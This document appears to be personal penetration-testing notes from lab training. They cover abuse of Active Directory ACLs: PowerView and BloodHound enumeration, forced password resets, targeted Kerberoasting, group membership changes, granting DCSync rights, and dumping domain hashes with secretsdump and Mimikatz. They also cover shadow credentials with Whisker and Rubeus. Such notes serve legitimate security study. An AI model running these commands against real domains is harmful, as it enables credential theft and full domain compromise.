# Content
- [ACL Enumeration](#acl-enumeration)
  - [ACL Enumeration with Powerview](#acl-enumeration-with-powerview)
  - [ACL Enumeration with BloodHound](#acl-enumeration-with-bloodhound)
 
- [ACL Dangerous Rights](#acl-dangerous-rights)
  - [ForceChangePassword](#forcechangepassword)
  - [GenericWrite](#genericwrite)
  - [GenericAll](#genericall)
  - [Get Changes All](#get-changes-and-get-changes-all)
  - [WriteDacl](#writedacl)
- [ACL attacks](#acl-attacks)
  - [Change password](#change-password)
  - [Targeted Kerberoasting](#targeted-kerberoasting)
  - [Add to group](#add-to-group)
  - [DCSync](#dcsync)
  - [Shadow Credentials](#shadow-credentials)
  - [Resource-based constrained delegation](#resource-based-constrained-delegation)

# ACL Enumeration
## ACL Enumeration with Powerview
- [control-access-rights list](https://learn.microsoft.com/en-us/windows/win32/adschema/control-access-rights)
- [ace-strings right list](https://learn.microsoft.com/en-us/windows/win32/secauthz/ace-strings)
```powershell
# get all intersting acl but can take alot of time
Find-InterestingDomainAcl

# specify one object
$sid = Convert-NameToSid wley
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}

# specify one object to one target
Get-DomainObjectACL -ResolveGUIDs -Identity  "GPO Management" | ? {$_.SecurityIdentifier -eq $sid}

Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl

# Reverse Search & Mapping to a GUID Value
$guid= "00299570-246d-11d0-a768-00aa006e0529"
Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl

# Creating a List of Domain Users
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt

# read from list a specfic user
foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}

# Investigating the Help Desk Level 1 Group with Get-DomainGroup
Get-DomainGroup -Identity "Help Desk Level 1" | select memberof

# Checking for Reversible Encryption Option
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol

```

in here the `S-1-5-21-3842939050-3880317879-2865463114-1181` user have `User-Force-Change-Password` right on `S-1-5-21-3842939050-3880317879-2865463114-1176` user
![Screenshot_2](https://github.com/kiro6/penetration-testing-notes/assets/57776872/891252fe-052c-4e21-9034-2bbfeaa3eff6)



in here `S-1-5-21-3842939050-3880317879-2865463114-5614` have `Self-Membership` and `ReadProperty, WriteProperty, GenericExecute` on `S-1-5-21-3842939050-3880317879-2865463114-4046`
![Screenshot_2](https://github.com/kiro6/penetration-testing-notes/assets/57776872/0f2aaade-e4cc-4a62-b333-3828962e85b9)




## ACL Enumeration with BloodHound
- [SharpHound .NET](https://github.com/BloodHoundAD/SharpHound)
- [SharpHound powershell](https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1)
- [BloodHound]([https://github.com/BloodHoundAD/BloodHound](https://github.com/BloodHoundAD/BloodHound/releases))
```powershell
.\SharpHound.exe -c All --zipfilename ILFREIGHT

bloodhound 
```

# ACL Dangerous Rights

![Screenshot 2024-06-30 at 22-18-35 Active Directory Enumeration   Attacks](https://github.com/kiro6/penetration-testing-notes/assets/57776872/243dfde0-9db7-4c9e-a76b-85ed31054167)


![DACL abuse mindmap CnS4bNaY](https://github.com/user-attachments/assets/470006a4-3a95-44f2-b608-49e1a7ad7fb9)




## ForceChangePassword 
- gives us the right to reset a user's password without first knowing their password (should be used cautiously and typically best to consult our client before resetting passwords) 
- [how to do Change password](#change-password)


## GenericWrite

**gives us the right to write to any non-protected attribute on an object.** 


1) **Access over User account allows for:**
    - Targeted Kerberoasting: we could `assign them an SPN` and perform a `Kerberoasting attack` (which relies on the target account having a weak password set). [how to do Targeted Kerberoasting](#targeted-kerberoasting)
    - Shadow Credentials: Use this technique to impersonate a computer or user account by exploiting the privileges to create shadow credentials. [Shadow Credentials](#shadow-credentials)
2) **Access over Group allows for:**
    - we could `add ourselves` or another `security principal` to a given group [how to Add to group](#add-to-group) .
3) **Access over Computer user allows for:**
    - Shadow Credentials: Use this technique to impersonate a computer or user account by exploiting the privileges to create shadow credentials. [Shadow Credentials](#shadow-credentials)
    - we could perform a Kerberos Resource-based constrained delegation: write `msDS-AllowedToActOnBehalfOfOtherIdentitity` attribute. [Resource-based constrained delegation](#resource-based-constrained-delegation)




## GenericAll 

**full rights to the object**

1) **Access over User account allows for:**
   - Change the Target's Password [how to do Change password](#change-password)
   - Targeted Kerberoasting: we could `assign them an SPN` and perform a `Kerberoasting attack` (which relies on the target account having a weak password set).  [how to do Targeted Kerberoasting](#targeted-kerberoasting)
   - Shadow Credentials: Use this technique to impersonate a computer or user account by exploiting the privileges to create shadow credentials.  [Shadow Credentials](#shadow-credentials)
   - add `WriteDacl` to our user on this object [WriteDacl](#writedacl)
2) **Access over Group allows for:**
   - we could `add ourselves` or another `security principal` to a given group. [how to Add to group](#add-to-group)
   - add `WriteDacl` to our user on this object [WriteDacl](#writedacl) 
3) **Access over Computer user allows for:**
   - Shadow Credentials: Use this technique to impersonate a computer or user account by exploiting the privileges to create shadow credentials. [Shadow Credentials](#shadow-credentials)
   - we could perform a Kerberos Resource-based constrained delegation: write `msDS-AllowedToActOnBehalfOfOtherIdentitity` attribute. [Resource-based constrained delegation](#resource-based-constrained-delegation)
   - add `WriteDacl` to our user on this object [WriteDacl](#writedacl)
  
## Get Changes and Get Changes All 
- The user or service account with this permission ` DS-Replication-Get-Changes-All` and `DS-Replication-Get-Changes` can ask Domain Controllers to replicate all changes in the directory through `Directory Replication Service Remote Protocol (MS-DRSR)` , including those changes that are normally restricted, such as confidential attributes. it cannot be turned off or disabled.
- By default only Domain Admins, Enterprise Admins, Administrators, and Domain Controllers groups have the required privileges.

1) DCSync mimic a Domain Controller to retrieve user NTLM password hashes. [DCSync](#dcsync)



## WriteDacl
- needed rights `GenericAll`
- can give ourselvies any rights 

```powershell
# if we have GenericAll we can add WriteDacl to ourself
Add-ObjectAcl -TargetIdentity <Object_DN> -PrincipalIdentity <User_DN> -Rights WriteDacl

# use this to give ourself any permssion 
Add-DomainObjectAcl -PrincipalIdentity <CN> -Credential $Cred -Rights <String>
Add-DomainObjectAcl -PrincipalIdentity <CN> -Credential $Cred -RightsGUID <Guid>

Add-DomainObjectAcl -PrincipalIdentity 'kok' -Credential $Cred -TargetIdentity "DC=htb,DC=local" -Rights DCSync -Verbose
Add-ObjectAcl -PrincipalIdentity 'kok' -Credential $Cred -TargetIdentity "DC=htb,DC=local" -Rights DCSync -Verbose
```


# Acl Attacks 

## Change password 
needed rights `GenericAll` or `ForceChangePassword`  

### Exploit
Use the `wley` user to change the password for the `damundsen` user


create a [PSCredential object](https://docs.microsoft.com/en-us/dotnet/api/system.management.automation.pscredential?view=powershellsdk-7.0.0) for `wley` using his password
```powershell
$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<Domain\User>', $SecPassword)
```
create a [SecureString object](https://docs.microsoft.com/en-us/dotnet/api/system.security.securestring?view=net-6.0) which represents the password we want to set for the target user damundsen.
```powershell
$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
```

using PowerView change the password 
```powershell
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
```

### or if you are in context of the AD object 
```powershell
$blakePassword = ConvertTo-SecureString 'Hacked@12345' -AsPlainText -Force
Set-DomainUserPassword -Domain painters -Identity blake -AccountPassword $blakePassword  -Verbose

```


## Targeted Kerberoasting
needed rights `GenericAll` or `GenericWrite`  

### Exploit 
damundsen user have GenericWrite over adunn user so we can do Targeted Kerberoasting


create a [PSCredential object](https://docs.microsoft.com/en-us/dotnet/api/system.management.automation.pscredential?view=powershellsdk-7.0.0) for `damundsen` using his password
```powershell
$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<Domain\User>', $SecPassword)
```

create the fake SPN for `adunn` user
```powershell
Set-DomainObject -Credential $Cred -Identity <Target User> -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```

use `Rubeus` to catch the ticket also check this [kerberoasting](https://github.com/kiro6/penetration-testing-notes/blob/main/Penetration%20Testing/Kerberos%20attacks/README.md#kerberoasting)
```powershell
.\Rubeus.exe kerberoast /user:<User> /nowrap
```

### Clean
remove the spn from the user
```
Set-DomainObject -Credential $Cred -Identity <User to remove> -Clear erviceprincipalname -Verbose
```


## Add to group 
needed rights `GenericAll` or `GenericWrite`  


### Exploit 
damundsen user have GenericWrite over Help Desk Level 1 group so we can add our selves 


create a [PSCredential object](https://docs.microsoft.com/en-us/dotnet/api/system.management.automation.pscredential?view=powershellsdk-7.0.0) for `damundsen` using his password
```powershell
$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<Domain\User>', $SecPassword)
```

using PowerView add yourslef
```powershell
# check group members
Get-ADGroup -Identity "<Group Name>" -Properties * | Select -ExpandProperty Members

# add your user
Add-DomainGroupMember -Identity '<Group Name>' -Members '<User to Add>' -Credential $Cred -Verbose
```

### Clean
remove the user from the group
```
Remove-DomainGroupMember -Identity <Group Name>" -Members 'Target User' -Credential $Cred -Verbose
```

### Defense

Enabling the `Advanced Security Audit Policy` can help in detecting unwanted changes, especially `Event ID 5136: A directory service object was modified` which would indicate that the domain object was modified


## DCSync
- needed rights `DS-Replication-Get-Changes-All` and `DS-Replication-Get-Changes`

### Exploit
adunn have `Get-Changes-All` and `Get-Changes` over DC so we will extract domain hashes 

#### Linux 
```shell
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5

# -just-dc flag tells the tool to extract NTLM hashes and Kerberos keys from the NTDS file.
# -just-dc-ntlm flag if we only want NTLM hashes
# -just-dc-user <USERNAME> to only extract data for a specific user.
# -pwd-last-set to see when each account's password was last changed
# -history if we want to dump password history
# -user-status is another helpful flag to check and see if a user is disabled
```
- there are three output files: one containing the NTLM hashes, one containing Kerberos keys, and one that would contain cleartext passwords from the NTDS for any accounts set with `reversible encryption` enabled.
- The trick here is that the key needed to decrypt the accounts with `reversible encryption` is stored in the registry ([the Syskey](https://docs.microsoft.com/en-us/windows-server/security/kerberos/system-key-utility-technical-overview)) 
```
ls inlanefreight_hashes*

inlanefreight_hashes.ntds  inlanefreight_hashes.ntds.cleartext  inlanefreight_hashes.ntds.kerberos
```

#### Windows 
- Using Mimikatz, we must target a specific user
- We could also target the krbtgt account and use this to create a Golden Ticket for persistence you can check here for more [ticket-abuse](https://github.com/kiro6/penetration-testing-notes/blob/main/Penetration%20Testing/Kerberos%20attacks/README.md#ticket-abuse)
```
.\mimikatz.exe  "privilege::debug" "lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator"
.\mimikatz.exe  "privilege::debug" "lsadump::dcsync /domain:painters.htb /user:painters.htb\krbtgt /all /csv"
.\mimikatz.exe  "privilege::debug" "lsadump::dcsync /user:painters\matt /history"

```

## Shadow Credentials
- needed rights : write the `msDS-KeyCredentialLink` attribute

### Exploit 
we have write right over `ZPH-SVRMGMT1$` computer 

#### Windows
```powershell
# use Whisker 
.\Whisker.exe list /target:ZPH-SVRMGMT1$
.\Whisker.exe add /target:ZPH-SVRMGMT1$

# Whisker will output similar output for Rubeus
Rubeus.exe asktgt /user:ZPH-SVRMGMT1$ /certificate:<cert> /password:"2hI2TIOeZevndEXG" /domain:zsm.local /dc:ZPH-SVRDC01.zsm.local /getcredentials /show

```

## Resource-based constrained delegation

check [Resource-based constrained delegation section in my repo](https://github.com/kiro6/penetration-testing-notes/blob/main/Penetration%20Testing/Kerberos%20attacks/README.md#resource-based-constrained-delegation)



